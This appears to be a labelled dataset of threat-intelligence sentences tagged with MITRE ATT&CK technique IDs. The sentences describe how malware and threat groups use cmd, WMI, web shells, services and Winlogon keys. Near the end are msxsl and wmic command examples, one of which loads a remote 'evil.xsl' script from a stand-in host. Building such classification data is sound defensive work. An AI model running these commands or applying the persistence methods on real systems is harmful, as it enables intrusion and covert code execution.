+T1071,Machete malware used Python’s urllib library to make HTTP requests to the C2 server.
+T1102,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system."
+T1102,Bazar downloads have been hosted on Google Docs.
+T1102,"DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions."
+T1102,NETWIRE has used web services including Paste.ee to host payloads.
+T1102,GuLoader has the ability to download malware from Google Drive.
+T1102,FIN6 has used Pastebin and Google Storage to host content for their operations.
+T1102,"Rocke has used Pastebin, Gitee, and GitLab for Command and Control."
+T1102,Fox Kitten has used Amazon Web Services to host C2.
+T1102,Chimera has used Google Cloud's appspot service to host C2 servers.
+T1583,"APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads."
+T1583,Lazarus Group has hosted malicious downloads on Github.
+T1583,IndigoZebra created Dropbox accounts for their operations.
+T1584,"Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control  or Exfiltration Over Web Service."
+T1584,"By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them."
+T1550,There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.
+T1550,UNC2452 used a forged duo-sid cookie to bypass MFA set on an email account.
+T1505,The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services .
+T1505,China Chopper's server component is a Web Shell payload.
+T1505,OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390.
+T1505,Webshell can gain remote access and execution on target web servers.
+T1505,APT32 has used Web shells to maintain access to victim websites.
+T1505,Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.
+T1505,GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration.
+T1505,Fox Kitten has installed web shells on compromised hosts to maintain access.
+T1059,Adversaries may leverage cmd to execute various commands and payloads.
+T1059,A module in CozyCar allows arbitrary commands to be executed by invoking C:\Windows\System32\cmd.exe.
+T1059,Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.
+T1059,H1N1 kills and disables services by using cmd.exe.
+T1059,SEASHARPEE can execute commands on victims.
+T1059,OceanSalt has been executed via malicious macros.
+T1059,Kasidet can execute commands using cmd.exe.
+T1059,InnaputRAT launches a shell to execute commands on the victim’s machine.
+T1059,Pisloader uses cmd.exe to set the Registry Run key value.
+T1059,Bankshot uses the command-line interface to execute arbitrary commands.
+T1059,OopsIE uses the command prompt to execute commands on the victim's machine.
+T1059,Felismus uses command line for execution.
+T1059,It can also provide a reverse shell.
+T1059,Mis-Type uses cmd.exe to run commands for enumerating the host.
+T1059,One version of Helminth uses batch scripting.
+T1059,BADNEWS is capable of executing commands via cmd.exe.
+T1059,RATANKBA uses cmd.exe to execute commands.
+T1059,Daserf can execute shell commands.
+T1059,Dipsind can spawn remote shells.
+T1059,MURKYTOP uses the command-line interface.
+T1059,TURNEDUP is capable of creating a reverse shell.
+T1059,SeaDuke is capable of executing commands.
+T1059,SamSam uses custom batch scripts to execute some of its components.
+T1059,Ixeshe is capable of executing commands via cmd.
+T1059,"HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line."
+T1059,"MoonWind uses batch scripts for various purposes, including to restart and uninstall itself."
+T1059,Rising Sun executed commands using cmd.exe.
+T1059,The Maze encryption process has used batch scripts with various commands.
+T1059,Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process.
+T1059,Anchor has used cmd.exe to run its self deletion routine.
+T1059,BLINDINGCAN has executed commands via cmd.exe.
+T1059,Cobalt Strike uses a command-line interface to interact with systems.
+T1059,Bazar can launch cmd.exe to perform reconnaissance commands.
+T1059,SharpStage can execute arbitrary commands with the command line.
+T1059,NETWIRE can issue commands using cmd.exe.
+T1059,BlackMould can run cmd.exe with parameters.
+T1059,LookBack executes the cmd.exe command.
+T1059,ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine.
+T1059,Clop can use cmd.exe to help execute commands on the system.
+T1059,Babuk has the ability to use the command line to control execution on compromised hosts.
+T1059,xCaon has a command to start an interactive shell.
+T1059,Seth-Locker can execute commands via the command line shell.
+T1059,"APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution."
+T1059,Magic Hound has used the command-line interface.
+T1059,menuPass has used malicious macros embedded inside Office documents to execute files.
+T1059,FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities.
+T1059,APT18 uses cmd.exe to execute commands on the victim’s machine.
+T1059,Patchwork used JavaScript code and .SCT files on victim machines.
+T1059,APT32 has used cmd.exe for execution.
+T1059,FIN7 used the command prompt to launch commands on the victim’s machine.
+T1059,A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.
+T1059,OilRig has used macros to deliver malware such as QUADAGENT and OopsIE.
+T1059,TA551 has used cmd.exe to execute commands.
+T1059,Sandworm Team has run the  xp_cmdshell command in MS-SQL.
+T1555,"The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers ."
+T1555,"The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials."
+T1555,Adversaries may also abuse Windows APIs such as CredEnumerateA to list credentials managed by the Credential Manager.
+T1555,Turla has gathered credentials from the Windows Credential Manager tool.
+T1555,OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.
+T1222,"Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object."
+T1222,"Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders."
+T1047,"An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement."
+T1047,A BlackEnergy 2 plug-in uses WMI to gather victim host details.
+T1047,RATANKBA uses WMI to perform process monitoring.
+T1047,Octopus has used wmic.exe for local discovery information.
+T1047,NotPetya can use wmic to help propagate itself across a network.
+T1047,HOPLIGHT has used WMI to recompile the Managed Object Format  files in the WMI repository.
+T1047,FlawedAmmyy leverages WMI to enumerate anti-virus on the victim.
+T1047,Emotet has used WMI to execute powershell.exe.
+T1047,Cobalt Strike can use WMI to deliver a payload to a remote host.
+T1047,Agent Tesla has used wmi queries to gather information from the system.
+T1047,MoleNet can perform WMI commands on the system.
+T1047,MuddyWater has used malware that leveraged WMI for execution and querying host information.
+T1047,Leviathan has used WMI for execution.
+T1047,FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.
+T1047,FIN6 has used WMI to automate the remote execution of PowerShell scripts.
+T1047,"APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit."
+T1047,Blue Mockingbird has used wmic.exe to set environment variables.
+T1546,Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation  event subscription.
+T1546,SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.
+T1546,FIN8 has used WMI event subscriptions for persistence.
+T1021,APT29 has used WinRM via PowerShell to execute command and payloads on remote hosts.
+T1543,"When Windows boots up, it starts programs or applications called services that perform background system functions."
+T1543,Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.
+T1543,TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.
+T1543,Kwampirs creates a new service named WmiApSrvEx to establish persistence.
+T1543,"When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key."
+T1543,Wiarp creates a backdoor through which remote attackers can create a service.
+T1543,Emissary is capable of configuring itself as a service.
+T1543,"If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence."
+T1543,Naid creates a new service to establish.
+T1543,"Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry."
+T1543,PlugX can be added as a service to establish persistence.
+T1543,"PlugX also has a module to change service configurations as well as start, control, and delete services."
+T1543,GoldenSpy has established persistence by running in the background as an autostart service.
+T1543,Honeybee has batch files that modify the system service COMSysApp to load a malicious DLL.
+T1543,APT32 also creates a Windows service to establish persistence.
+T1543,Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.
+T1543,TeamTNT uses malware that adds cryptocurrency miners as a service.
+T1547,"Specifically, the following subkeys have been known to be possibly vulnerable to abuse: 
+* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
+* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
+* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on
+Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence."
+T1547,"Gazer can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon."
+T1547,Remexi achieves persistence using Userinit by adding the Registry key HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit.
+T1547,Bazar can use Winlogon Helper DLL to establish persistence.
+T1547,Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user.
+T1547,Adversaries may also use Masquerading to make XDG autostart entries look as if they are associated with legitimate programs.
+T1220,Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.
+T1220,"Command-line examples:
+* msxsl.exe customers.xml script.xsl
+* msxsl.exe script.xsl script.xsl
+* msxsl.exe script.jpeg script.jpeg
+Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file."
+T1220,"Command-line examples:
+* Local File: wmic process list /FORMAT:evil.xsl
+* Remote File: wmic os get /FORMAT:”https://example.com/evil.xsl” Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain."
